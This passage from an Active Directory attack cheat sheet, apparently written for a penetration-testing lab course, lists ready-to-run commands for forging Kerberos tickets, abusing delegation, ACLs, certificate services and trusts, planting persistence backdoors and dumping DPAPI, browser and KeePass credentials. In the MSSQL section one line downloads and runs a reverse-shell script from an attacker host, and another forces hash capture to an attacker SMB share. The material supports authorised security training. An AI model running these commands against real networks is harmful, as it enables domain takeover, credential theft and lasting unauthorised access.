> Requests a legitimate TGT then decrypts and modifies it (changes user, groups, etc.) using the krbtgt key. Much harder to detect than a Golden Ticket because it starts from a real ticket.

```powershell
# Rubeus — forge a Diamond Ticket: request real TGT, decrypt with krbtgt AES key, modify PAC to impersonate administrator, re-encrypt and inject
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:Administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt

# Same but using TGT delegation trick (gets initial TGT via Kerberos delegation instead of credentials)
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /tgtdeleg /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

### Skeleton Key

> Injects a master password ("mimikatz") into the DC's LSASS process. After injection, any user can authenticate with their real password OR "mimikatz".

```powershell
# Inject skeleton key into the domain controller's LSASS (must run ON the DC, requires DA/SYSTEM)
Invoke-Mimikatz -Command '"misc::skeleton"' -ComputerName dcorp-dc
# After this, you can authenticate as any user with password "mimikatz"
```

---

## 6. Delegation Abuse

### Unconstrained Delegation

> Computers with unconstrained delegation store the TGT of any user that authenticates to them. If you compromise such a machine, you can steal those TGTs and impersonate those users.

```powershell
# Find computers with unconstrained delegation enabled
Get-DomainComputer -Unconstrained                               # PowerView
Get-ADComputer -Filter {TrustedForDelegation -eq $true}         # AD Module

# Monitor for incoming TGTs on the compromised unconstrained delegation machine
Rubeus.exe monitor /interval:5 /nowrap /targetuser:administrator  # Watch for admin TGTs arriving every 5 seconds
Rubeus.exe monitor /interval:5 /nowrap /filteruser:dcorp-dc$      # Watch for the DC machine account's TGT

# Force the DC to authenticate to our machine using the Printer Bug (SpoolService RPC abuse)
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

# After capturing the TGT, inject it into the current session for impersonation
Rubeus.exe ptt /ticket:<base64_ticket>
```

---

### Constrained Delegation

> Accounts with constrained delegation can request service tickets to specific services on behalf of any user, using the S4U (Service-for-User) Kerberos extensions.

```powershell
# Find users and computers with constrained delegation
Get-DomainUser -TrustedToAuth                                   # PowerView: find users
Get-DomainComputer -TrustedToAuth                               # PowerView: find computers
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo      # AD Module: find users
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo  # AD Module: find computers

# Rubeus S4U attack with a user account: request a ticket to the allowed SPN as administrator
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.local /ptt

# Same but with AES key and alternate service name (e.g., request CIFS ticket, then use /altservice to change it to HTTP)
Rubeus.exe s4u /user:svc_web /aes256:AES_KEY /impersonateuser:administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.local /altservice:HTTP /ptt

# Rubeus S4U with a computer account: change the service type using /altservice (e.g., TIME → LDAP)
Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:HASH /impersonateuser:administrator /msdsspn:TIME/dcorp-dc.dollarcorp.moneycorp.local /altservice:LDAP /ptt
```

```bash
# Impacket — S4U to impersonate Administrator for the target SPN
python3 getST.py -spn CIFS/target.domain.local -impersonate Administrator -dc-ip DC_IP domain/user:password
python3 getST.py -spn CIFS/target.domain.local -impersonate Administrator -hashes :NTLM_HASH domain/user

# Use the impersonated ticket
export KRB5CCNAME=Administrator.ccache
python3 psexec.py domain/Administrator@target -k -no-pass
```

---

### Resource-Based Constrained Delegation (RBCD)

> RBCD allows you to configure a computer to trust another computer to delegate on its behalf. Unlike regular delegation, RBCD is set on the target machine (not the delegating account).

```powershell
# Step 1: Check how many computer accounts a user can create (default is 10)
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota

# Step 1b: Create a new machine account we control using Powermad
New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

# Step 2: Set the RBCD attribute on the target — allows our FakeComputer to delegate to the target
$sid = Get-DomainComputer -Identity FakeComputer -Properties objectsid | Select-Object -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity target$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 3: Calculate the hash of FakeComputer's password, then perform S4U to impersonate admin
Rubeus.exe hash /password:Password123 /user:FakeComputer /domain:domain.local
Rubeus.exe s4u /user:FakeComputer$ /rc4:HASH /impersonateuser:administrator /msdsspn:CIFS/target.domain.local /ptt

# Verify the RBCD attribute is set
Get-DomainComputer -Identity target$ -Properties msds-allowedtoactonbehalfofotheridentity
```

```bash
# Impacket — set RBCD attribute on target (write FakeComputer as allowed to delegate)
python3 rbcd.py -action write -delegate-to "TARGET$" -delegate-from "FAKECOMPUTER$" -dc-ip DC_IP domain/user:password

# Request service ticket as Administrator via S4U
python3 getST.py -spn CIFS/target.domain.local -impersonate Administrator -dc-ip DC_IP domain/FakeComputer$:Password123

# Use the ticket
export KRB5CCNAME=Administrator.ccache
python3 psexec.py domain/Administrator@target.domain.local -k -no-pass

# Cleanup — remove the RBCD configuration from the target
python3 rbcd.py -action flush -delegate-to "TARGET$" -dc-ip DC_IP domain/user:password
```

---

## 7. ACL / ACE Abuse

> ACLs define who can do what to AD objects. Misconfigured ACLs let attackers reset passwords, add group members, grant DCSync rights, and more.

### Common Dangerous ACEs

```powershell
# GenericAll on a user — you have full control, so you can reset their password
net user targetuser NewPassword /domain
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)

# GenericAll on a group — you can add any user (including yourself) to that group
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
net group "Domain Admins" attacker /add /domain

# GenericAll on a computer — abuse via RBCD (see Section 6)

# GenericWrite on a user — you can modify attributes like SPN (set an SPN to enable Kerberoasting)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='anything/whatever'}
# Now you can Kerberoast the target user and crack their password

# WriteDACL on the domain object — grant yourself DCSync rights (Replicating Directory Changes)
Add-DomainObjectAcl -TargetIdentity "DC=dollarcorp,DC=moneycorp,DC=local" -PrincipalIdentity student1 -Rights DCSync

# WriteOwner — take ownership of an object, then modify its DACL to give yourself full control
Set-DomainObjectOwner -Identity target -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity attacker -Rights All

# ForceChangePassword — directly reset a user's password without knowing the current one
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)

# AllExtendedRights on an OU containing computers — read LAPS passwords stored on computer objects
Get-DomainComputer -Identity target -Properties ms-mcs-admpwd
```

---

### RACE.ps1 (ACL Persistence)

> RACE.ps1 modifies security descriptors on various AD and Windows services to provide persistent backdoor access.

```powershell
# Set full control ACL for a user on AdminSDHolder — after SDProp runs (~60 min), this propagates to all protected groups (Domain Admins, etc.)
Set-RemoteAccessConnection -SamAccountName student1 -DistinguishedName "CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local"

# Modify WMI security descriptor so a low-priv user can run WMI queries/commands on a remote machine
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Verbose

# Modify PSRemoting security descriptor so a low-priv user can use Enter-PSSession/Invoke-Command on a remote machine
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose

# Add a registry backdoor — allows reading the machine account hash and local account hashes remotely
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```

---

## 8. AD CS (Certificate Services) Abuse

### Certify (Windows)

> Certify finds and exploits misconfigured AD Certificate Services (ADCS) templates. Certificate abuse can provide domain admin or persistent access.

```powershell
Certify.exe cas                          # List all Certificate Authorities in the domain

Certify.exe find                         # Enumerate all available certificate templates and their settings
Certify.exe find /vulnerable             # Find templates with exploitable misconfigurations (ESC1-ESC8)
Certify.exe find /vulnerable /currentuser  # Same but only templates the current user can enroll in
Certify.exe find /enrolleeSuppliesSubject  # Find templates where the requester can specify the Subject Alternative Name (ESC1 condition)

# ESC1 — The template allows specifying an alternative SAN, so request a cert as administrator
Certify.exe request /ca:dcorp-dc.dollarcorp.moneycorp.local\dollarcorp-dcorp-dc-CA /template:VulnerableTemplate /altname:administrator

# ESC3 — Use an Enrollment Agent certificate to request certificates on behalf of other users
Certify.exe request /ca:CA_NAME /template:EnrollmentAgentTemplate                             # First: get an enrollment agent cert
Certify.exe request /ca:CA_NAME /template:TargetTemplate /onbehalfof:domain\administrator /enrollcert:agent.pfx  # Then: request a cert for admin using the agent cert

# Convert the PEM certificate to PFX format for use with Rubeus/Windows
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

---

### Certipy (Linux)

> Certipy is the Python equivalent of Certify — enumerate and exploit ADCS from Linux.

```bash
# Enumerate all CAs and certificate templates
certipy find -u user@domain -p password -dc-ip DC_IP

# Find only vulnerable templates
certipy find -u user@domain -p password -dc-ip DC_IP -vulnerable

# ESC1 — Request a certificate with an alternative UPN (impersonate administrator)
certipy req -u user@domain -p password -ca CA_NAME -target DC_IP -template VulnerableTemplate -upn administrator@domain

# ESC3 — Request an enrollment agent certificate
certipy req -u user@domain -p password -ca CA_NAME -target DC_IP -template EnrollmentAgent
# Then use the agent cert to request on behalf of administrator
certipy req -u user@domain -p password -ca CA_NAME -target DC_IP -template TargetTemplate -on-behalf-of 'domain\administrator' -pfx agent.pfx

# ESC4 — Modify a vulnerable template's configuration (save original for later restoration)
certipy template -u user@domain -p password -template VulnerableTemplate -save-old

# ESC6 — CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag, allowing SAN in any template
certipy req -u user@domain -p password -ca CA_NAME -target DC_IP -template User -upn administrator@domain

# ESC8 — Relay NTLM authentication to the CA's HTTP enrollment endpoint to get a certificate
certipy relay -target http://ca-server/certsrv/certfnsh.asp -ca CA_NAME --template DomainController

# Authenticate to AD using a certificate (PKINIT) — returns TGT and NT hash
certipy auth -pfx cert.pfx -dc-ip DC_IP
certipy auth -pfx cert.pfx -username administrator -domain domain.local -dc-ip DC_IP

# Shadow Credentials via Certipy — adds a key credential to the target, gets a cert, and authenticates
certipy shadow auto -u user@domain -p password -account target

# Create a machine account certificate for persistence
certipy account create -u user@domain -p password -dns target.domain.local
```

---

### Certificate-Based Auth (Rubeus)

> Use a certificate (.pfx) to request a Kerberos TGT via PKINIT — alternative to password/hash-based authentication.

```powershell
# Request a TGT using a certificate and inject into the current session
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfx_password /ptt

# Same but also extract the user's NTLM hash from the TGT (UnPAC-the-hash)
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfx_password /getcredentials /show /nowrap
```

---

## 9. Trust Abuse (Cross-Domain & Cross-Forest)

### Child-to-Parent Domain Escalation

> In a forest with parent-child domain trusts, a Domain Admin in the child domain can escalate to Enterprise Admin in the parent domain by forging inter-realm TGTs with SID History.

```powershell
# Extract the trust key between the child and parent domain
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

# Or use DCSync to get the trust account's hash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'

# Forge an inter-realm TGT using the trust key, injecting the Enterprise Admins SID (-519) into SID History
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-<child-SID> /sids:S-1-5-21-<parent-SID>-519 /rc4:<trust_key> /service:krbtgt /target:moneycorp.local /ticket:trust_tgt.kirbi"'

# Alternative: use the child domain's krbtgt hash (Golden Ticket with SID History)
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-<child-SID> /sids:S-1-5-21-<parent-SID>-519 /krbtgt:<child_krbtgt_hash> /ptt"'

# Rubeus version
Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-<child-SID> /sids:S-1-5-21-<parent-SID>-519 /user:Administrator /ptt

# Use the forged inter-realm TGT to request a service ticket in the parent domain
Rubeus.exe asktgs /ticket:trust_tgt.kirbi /service:CIFS/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

```bash
# Impacket — create a Golden Ticket with extra SID for Enterprise Admins in the parent domain
python3 ticketer.py -nthash <child_krbtgt_hash> -domain-sid S-1-5-21-<child-SID> -domain dollarcorp.moneycorp.local -extra-sid S-1-5-21-<parent-SID>-519 Administrator

# Use the ticket to access the parent domain DC
export KRB5CCNAME=Administrator.ccache
python3 psexec.py dollarcorp.moneycorp.local/Administrator@mcorp-dc.moneycorp.local -k -no-pass
```

---

### Cross-Forest Attacks

```powershell
# Enumerate trusts with external forests
Get-DomainTrust -Domain eurocorp.local                          # List trusts for the external domain
Get-ForestTrust                                                 # List all forest-level trusts
Get-ADTrust -Filter 'IntraForest -ne $true'                     # Find only inter-forest (external) trusts

# Forge an inter-realm TGT using the external trust key (for accessing resources in another forest)
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-<SID> /rc4:<trust_key> /service:krbtgt /target:eurocorp.local /ticket:forest_tgt.kirbi"'

# Request a service ticket in the external forest using the forged TGT
Rubeus.exe asktgs /ticket:forest_tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt

# If SID filtering is disabled: Golden Ticket with SID History to become Enterprise Admin in another forest
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-<SID> /krbtgt:<hash> /sids:S-1-5-21-<foreign-forest-SID>-519 /ptt"'

# PAM Trust — enumerate shadow principals (accounts from another forest mapped into this one)
Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,$(Get-ADRootDSE | Select-Object -ExpandProperty configurationNamingContext)" -Filter * -Properties *

# Find users from your domain that are members of groups in the foreign domain
Get-DomainForeignGroupMember -Domain eurocorp.local

# Find users from foreign domains that are present in your domain
Get-DomainForeignUser -Domain eurocorp.local
```

---

## 10. Persistence

### DCSync Rights (ACL Persistence)

> Grant a low-privileged user the ability to DCSync (replicate AD data). Survives password changes of other accounts.

```powershell
# Grant DCSync rights (Replicating Directory Changes + Replicating Directory Changes All) to a user
Add-DomainObjectAcl -TargetIdentity "DC=dollarcorp,DC=moneycorp,DC=local" -PrincipalIdentity student1 -Rights DCSync -Verbose

# Verify the ACL was set correctly
Get-DomainObjectAcl -DistinguishedName "DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs | Where-Object {$_.IdentityReference -match "student1"}
```

---

### AdminSDHolder Abuse

> AdminSDHolder's ACL is applied to all protected groups (Domain Admins, etc.) every 60 minutes by the SDProp process. Adding your ACE to AdminSDHolder means it will be automatically restored even if someone removes it from the group.

```powershell
# Add full control ACL for a user on the AdminSDHolder object
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local" -PrincipalIdentity student1 -Rights All

# Force SDProp to run immediately (instead of waiting 60 minutes)
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

---

### DSRM Persistence

> The DSRM (Directory Services Restore Mode) password is a local admin password set during DC promotion. If network logon is enabled for DSRM, it can be used for PtH.

```powershell
# Dump the DSRM admin password hash from the DC's local SAM
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Enable network logon for the DSRM account (by default it can only be used in DSRM boot mode)
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Pass-the-Hash with the DSRM account to get a session on the DC
sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<DSRM_hash> /run:powershell.exe
```

---

### Security Descriptor Modification

> Modify security descriptors on WMI, PSRemoting, and Registry services to allow a low-privileged user persistent remote access without being an admin.

```powershell
# Allow a user to execute WMI queries remotely on the DC (backdoor via WMI namespace permissions)
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Verbose

# Allow a user to use PSRemoting on the DC (backdoor via WinRM endpoint permissions)
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose

# Add a registry backdoor that allows reading machine account hashes remotely
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose

# Read the DC's machine account hash via the registry backdoor
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

# Read local account hashes via the registry backdoor
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```

---

### Custom SSP (Security Support Provider)

> Register a malicious SSP DLL in the DC's LSASS process to log all cleartext credentials at logon time.

```powershell
# Inject mimilib.dll as a Security Support Provider — captures all passwords at logon
Invoke-Mimikatz -Command '"misc::memssp"'
# Cleartext passwords will be logged to: C:\Windows\System32\mimilsa.log
```

---

## 11. MSSQL Attacks

### PowerUpSQL

> PowerUpSQL discovers and exploits SQL Server instances in AD — finds linked servers, tests for code execution, and audits configurations.

```powershell
Import-Module .\PowerUpSQL.ps1                                  # Load PowerUpSQL module

# Discovery
Get-SQLInstanceDomain                                            # Find SQL Server instances registered as SPNs in Active Directory
Get-SQLInstanceBroadcast                                         # Find SQL instances via UDP broadcast on the local network
Get-SQLInstanceScanUDP -ComputerName dcorp-mgmt                  # Scan a specific host for SQL instances via UDP

# Information gathering
Get-SQLServerInfo -Instance dcorp-mssql                          # Get detailed info about a SQL instance (version, configuration, sysadmin status)
Get-SQLServerInfo -Instance dcorp-mssql -Username sa -Password password  # Same with SQL auth credentials

# Access testing
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded            # Test connectivity to all discovered SQL instances in parallel
Get-SQLInstanceDomain | Get-SQLServerInfo                        # Gather info from all accessible instances

# Database link enumeration and crawling
Get-SQLServerLink -Instance dcorp-mssql                          # List all linked servers configured on this SQL instance
Get-SQLServerLinkCrawl -Instance dcorp-mssql                     # Recursively crawl all linked servers (follow chains of links)

# Execute OS commands through linked server chains via xp_cmdshell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"

# Enable xp_cmdshell (OS command execution) on a SQL instance
Get-SQLQuery -Instance dcorp-mssql -Query "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"

# Query through a chain of linked servers using nested OPENQUERY
Get-SQLQuery -Instance dcorp-mssql -Query "SELECT * FROM OPENQUERY(""DCORP-SQL1"", 'SELECT * FROM OPENQUERY(""DCORP-MGMT"", ''SELECT @@version'')')"

# Check xp_cmdshell status through a chain of linked servers
Get-SQLQuery -Instance dcorp-mssql -Query "SELECT * FROM OPENQUERY(""DCORP-SQL1"", 'SELECT * FROM OPENQUERY(""DCORP-MGMT"", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''')')"

# Get a reverse shell through a linked server chain
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'powershell -ep bypass iex (New-Object Net.WebClient).DownloadString(''http://attacker/rev.ps1'')'"

# Run a full security audit on a SQL instance
Invoke-SQLAudit -Instance dcorp-mssql
```

---

### Manual SQL Commands

```sql
-- List all linked servers configured on the current instance
SELECT * FROM master..sysservers;
EXEC sp_linkedservers;

-- Execute a query on a linked server (e.g., check its SQL version)
SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT @@version');

-- Enable xp_cmdshell on a linked server (for OS command execution)
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER]
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER]
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

-- Enable RPC Out on a linked server (needed for EXEC AT syntax)
EXEC sp_serveroption 'LINKED_SERVER', 'rpc out', 'true';

-- Force the SQL Server to authenticate to an attacker's SMB server (captures NTLMv2 hash)
EXEC master..xp_dirtree '\\attacker_ip\share';
```

---

## 12. DPAPI & Credential Vaults

### SharpDPAPI

> SharpDPAPI decrypts DPAPI-protected secrets (browser passwords, credential manager, certificates, etc.) using domain backup keys or user keys.

```powershell
SharpDPAPI.exe triage                    # List all DPAPI-protected credential files and masterkeys found on the machine
SharpDPAPI.exe machinetriage             # Decrypt machine-level DPAPI secrets (Wi-Fi passwords, service account creds, etc.)

SharpDPAPI.exe masterkeys /pvk:backup_key.pvk  # Decrypt all user masterkeys using the domain DPAPI backup key (extracted from the DC)

SharpDPAPI.exe credentials /pvk:backup_key.pvk                        # Decrypt all Windows Credential Manager entries using the domain backup key
SharpDPAPI.exe credentials /target:C:\Users\user\AppData\Local\Microsoft\Credentials\  # Decrypt credential files from a specific path

# Extract the domain DPAPI backup key from the DC (requires DA)
SharpDPAPI.exe backupkey /server:dcorp-dc.dollarcorp.moneycorp.local

# Decrypt Chrome saved passwords using the domain backup key
SharpDPAPI.exe chrome /pvk:backup_key.pvk
SharpDPAPI.exe chrome /server:dcorp-dc.dollarcorp.moneycorp.local /pvk:backup_key.pvk
```

---

### ChromElevator

> Extracts saved Chrome browser credentials by leveraging DPAPI decryption.

```powershell
.\ChromElevator.exe                      # Extract and decrypt all saved Chrome passwords, cookies, and credit card data
```

---

### Mimikatz DPAPI

```powershell
# Extract the domain DPAPI backup key from a DC (can decrypt any domain user's DPAPI secrets)
lsadump::backupkeys /system:dcorp-dc.dollarcorp.moneycorp.local /export

# Decrypt a user's masterkey file using the domain backup key
dpapi::masterkey /in:masterkey_file /pvk:backup_key.pvk

# Decrypt a specific credential file using the decrypted masterkey
dpapi::cred /in:credential_file /masterkey:MASTERKEY

# List credentials stored in the Windows Credential Vault
vault::cred
vault::list
```

---

### KeePass Extraction

```powershell
.\KeeThief.exe                           # Extract the KeePass master key from the running KeePass process's memory
.\keepass_dump.exe                        # Exploit CVE-2023-32784 to dump the KeePass master password from a memory dump
```

---

## 13. LAPS, gMSA & DMSA

### LAPS (Local Administrator Password Solution)

> LAPS automatically rotates local admin passwords and stores them in AD. If you have read permissions on the LAPS attribute, you get the password.

```powershell
# PowerView — read LAPS passwords from computer objects (only returns results if you have read permission)
Get-DomainComputer -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime | Where-Object {$_.'ms-mcs-admpwd' -ne $null}

# AD Module — same query using Microsoft's module
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select-Object Name, ms-Mcs-AdmPwd

# LAPS v2 — uses a different attribute name
Get-ADComputer -Filter * -Properties msLAPS-Password | Where-Object {$_.'msLAPS-Password' -ne $null}

# Check who has permission to read LAPS passwords in a specific OU
Find-AdmPwdExtendedRights -Identity OUName

# Find which principals have the extended right to read ms-Mcs-AdmPwd on an OU
Get-DomainObjectAcl -Identity "OU=Servers,DC=domain,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "ms-Mcs-AdmPwd"}
```

```bash
# NetExec — read LAPS passwords via LDAP
nxc ldap DC_IP -u user -p password -M laps
```

---

### gMSA (Group Managed Service Accounts)

> gMSAs have automatically rotated passwords managed by AD. Certain principals are allowed to retrieve the password blob, which can be converted to an NTLM hash.

```powershell
# List all gMSA accounts in the domain
Get-ADServiceAccount -Filter {ObjectClass -eq 'msDS-GroupManagedServiceAccount'} -Properties *

# Check which principals are allowed to read this gMSA's password
Get-ADServiceAccount -Identity gmsaAccount -Properties PrincipalsAllowedToRetrieveManagedPassword

# Read the managed password blob from the gMSA
$gmsa = Get-ADServiceAccount -Identity gmsaAccount -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'

# Convert the password blob to plaintext/NTLM using DSInternals
ConvertFrom-ADManagedPasswordBlob $mp

# Calculate the NTLM hash from the gMSA password blob
$password = ConvertFrom-ADManagedPasswordBlob $mp
ConvertTo-NTHash -Password $password.SecureCurrentPassword
```

```bash
# gMSADumper — Python tool to extract gMSA password hashes from Linux
python3 gMSADumper.py -u user -p password -d domain.local

# NetExec — extract gMSA hashes via LDAP
nxc ldap DC_IP -u user -p password --gmsa
```

---

### DMSA / BadSuccessor

> Delegated Managed Service Accounts (DMSA) — a newer account type that can be abused via the "BadSuccessor" attack to escalate privileges.

```powershell
# SharpSuccessor — add the attacker's machine account as a successor to a DMSA (gains its privileges)
SharpSuccessor.exe /target:dcorp-dc.dollarcorp.moneycorp.local /account:attacker_machine$ /action:add

# Execute the attack — use the successor relationship to impersonate the DMSA
SharpSuccessor.exe /target:dcorp-dc.dollarcorp.moneycorp.local /account:attacker_machine$ /action:attack
```

---

## 14. Shadow Credentials

> Shadow Credentials abuse the msDS-KeyCredentialLink attribute. By adding a key credential to a target, you can then authenticate as that target using certificate-based Kerberos (PKINIT).

### Keycred

```powershell
# Add a shadow credential (key credential) to a target user or computer
Keycred.exe /add /target:targetuser /domain:dollarcorp.moneycorp.local
Keycred.exe /add /target:dcorp-dc$ /domain:dollarcorp.moneycorp.local

# Authenticate as the target using the generated certificate and get a TGT
Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /password:password /ptt /getcredentials
```

---

### pywhisker (Linux)

> Python tool for managing shadow credentials (msDS-KeyCredentialLink) from Linux.

```bash
# Add a shadow credential to a target account (generates a certificate for auth)
python3 pywhisker.py -d domain.local -u user -p password --target targetuser --action add --dc-ip DC_IP

# List all key credentials on a target account
python3 pywhisker.py -d domain.local -u user -p password --target targetuser --action list --dc-ip DC_IP

# Remove a specific shadow credential by its device ID
python3 pywhisker.py -d domain.local -u user -p password --target targetuser --action remove --device-id DEVICE_ID --dc-ip DC_IP
```

---

### Certipy Shadow Credentials

```bash
# Automated shadow credential attack: adds key cred, gets certificate, authenticates, and returns NTLM hash
certipy shadow auto -u user@domain -p password -account targetuser -dc-ip DC_IP
```

---

## 15. GPO Abuse

> If you have write permissions on a Group Policy Object (GPO), you can modify it to push malicious configurations (local admin, scheduled tasks, startup scripts) to all computers/users the GPO applies to.

### SharpGPOAbuse

```powershell
# Add a user as local administrator on all machines where this GPO is applied
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount student1 --GPOName "Vulnerable GPO"

# Add a startup script that runs every time a computer in the GPO scope boots
SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net localgroup administrators student1 /add" --GPOName "Vulnerable GPO"

# Create an immediate scheduled task (runs once on all affected machines)
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author NT_AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c net localgroup administrators student1 /add" --GPOName "Vulnerable GPO"

# Assign a user rights privilege (e.g., SeTakeOwnershipPrivilege) to a user via GPO
SharpGPOAbuse.exe --AddUserRightsAssignment --UserRightsAssignment "SeTakeOwnershipPrivilege" --UserAccount student1 --GPOName "Vulnerable GPO"
```

---

### GPOddity (Linux)

> Python tool for exploiting GPO write permissions from Linux.

```bash
# Inject a command into a GPO that will execute on all machines in the GPO's scope
python3 gpoddity.py -d domain.local -u user -p password -gpo-id '{GPO-GUID}' -command 'cmd /c net localgroup administrators attacker /add'
```

---

## 16. Azure AD / Entra Connect Abuse

### AD Connect / MSOL Account Abuse

> Azure AD Connect (Entra Connect) syncs on-premises AD with Azure AD. The MSOL_ service account it uses often has DCSync rights, and its credentials are stored locally on the Connect server.

```powershell
# Extract the MSOL_ account credentials from the Entra Connect server using AADInternals
Import-Module .\AADInternals.psd1
Get-AADIntSyncCredentials                # Returns the MSOL_ account username and plaintext password

# Manual extraction — convert the SecureString stored in the local database
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))

# Use the extracted MSOL_ credentials to DCSync (the account has Replicating Directory Changes rights)
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

---

### PHS (Password Hash Sync) Abuse

> If Password Hash Sync is enabled, the MSOL account replicates password hashes from on-prem AD to Azure AD — meaning it already has DCSync permissions.

```powershell
# Extract MSOL creds (same as above), then DCSync to get all domain password hashes
Get-AADIntSyncCredentials               # Get the MSOL_ account credentials
Get-AADIntADSyncConfig                  # Read the AD Connect synchronization configuration
```

---

### Service Principal Certificate Extraction

```powershell
# Extract the encryption key used by AD Connect to protect stored credentials
Get-AADIntSyncEncryptionKey

# Extract all stored sync credentials including service principal certificates
Get-AADIntSyncCredentials
# The extracted certificate can be used to authenticate as the Azure AD service principal
```

---

## 17. Coercion Attacks

> Coercion attacks force a target machine (usually a DC) to authenticate to an attacker-controlled machine. The captured authentication can be relayed or the TGT can be stolen (if targeting an unconstrained delegation machine).

### PrinterBug / SpoolService (MS-RPRN)

```powershell
# Force the target DC to authenticate to the attacker's machine via the Print Spooler RPC interface
.\MS-RPRN.exe \\target_dc.domain.local \\attacker_machine.domain.local
```

```bash
# Python version of the Printer Bug (dementor)
python3 dementor.py -u user -p password -d domain.local attacker_ip target_ip
```

---

### PetitPotam (MS-EFSRPC)

> Abuses the Encrypting File System Remote Protocol to coerce authentication.

```bash
# Authenticated PetitPotam — force the target to authenticate to the attacker
python3 PetitPotam.py -u user -p password -d domain attacker_ip target_ip

# Unauthenticated PetitPotam — works on unpatched systems without credentials
